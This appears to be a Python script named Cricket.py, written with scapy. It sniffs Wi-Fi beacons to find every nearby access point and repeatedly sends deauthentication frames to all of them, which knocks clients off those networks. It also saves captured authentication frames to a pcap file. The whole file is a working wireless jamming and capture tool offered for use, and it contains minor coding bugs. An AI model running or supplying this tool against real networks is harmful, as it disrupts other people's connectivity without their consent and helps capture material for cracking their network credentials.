#!/bin/python3

from sys import argv
from os import path
from scapy.all import *
#from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
#from scapy.utils import PcapWriter
#from scapy.sendrecv import sniff

CLI = argv[:]

global AP_list
global ignore_AP

# PROGRAM SEQUENCE
# 1. Locate AP via sniffing beacons
# 2. Add to list of APs
# 3. Send deauth to all APs in list
# 4. Sniff for Auth Frames

help_message = """
Cricket.py

Usage:
	Cricket.py [options]
		<iface> will send or receive all packets unless otherwise specified

Options:
	-h								Display this help message
	-v 								Enable verbose output for this program
	-i ["BSSID, ..." | PATH]	 	Ignore AP(s), either listing AP's or using a file separated by lines
	-o <FILE>						Output captured Auth packets to FILE

The output of this file will be 
"""
verbose = False
output_file = None
ignore_AP = []
AP_list = []


for x in range(1,len(CLI) - 1):
	if CLI[x] == "-h":
		print(help_message)
		quit()
	if CLI[x] == "-v":
		verbose = True
	if CLI[x] == "-i":
		if os.path.exists(CLI[x+1]):
			with open(CLI[x+1]) as file:
				ignore_AP.append(file.readlines())
		else:
			ignore_AP = CLI[x+1].split(", ")
	if CLI[x] == "-o":
		output_file = CLI[x+1]

if verbose == True:
	def verbose_output(status, output, *details):
		if status == 1:
			statement = "\t[*] "
		elif status == 0:
			statement = "\t[ ] "
		elif status == 2:
			statement = ""
		statement += output
		for x in details:
			statement += "\n\t\t" + x
		print(statement)
else:
	def verbose_output(status, output, *details):
		return None

init_statement = f'''Initialised program with variables:
	verbose = {verbose}
	output_file = {output_file}
	Ignoring AP's: '''

verbose_output(2, init_statement, *ignore_AP)

if output_file != None:
	output = PcapWriter(output_file, append=True)

def Jammer(AP_list):
	if len(AP_list) != 0:
		for AP in AP_list:
			verbose_output(1, f'De-Authenticating All Clients on AP:', AP)
			DeAuth_Frame = RadioTap()/Dot11(addr1 = RandMAC(), addr2 = AP, addr3 = AP)/Dot11Deauth(reason=2)
			sendp(DeAuth_Frame)

def PacketHandler(packet):
	verbose_output(1, f'Found packet')
	if packet.haslayer(Dot11):
		if packet.type == 0:
			verbose_output(1, f'Found Management Frame')
			if packet.subtype == 8:
				verbose_output(1, f'Found Beacon Frame')
				if packet.addr2 not in ignore_AP and packet.addr2 not in AP_list:
					AP_list.append(packet.addr2)
					verbose_output(1, f'Access Point Found: {packet.addr2}')
			elif packet.subtype == 11:
				if output:
					output.write(packet)
					verbose_output(1, f'Authentication Frame Found for AP {packet.addr2}')
	Jammer(AP_list)

verbose_output(0, f'Starting loop')

sniff(prn = PacketHandler, monitor = True)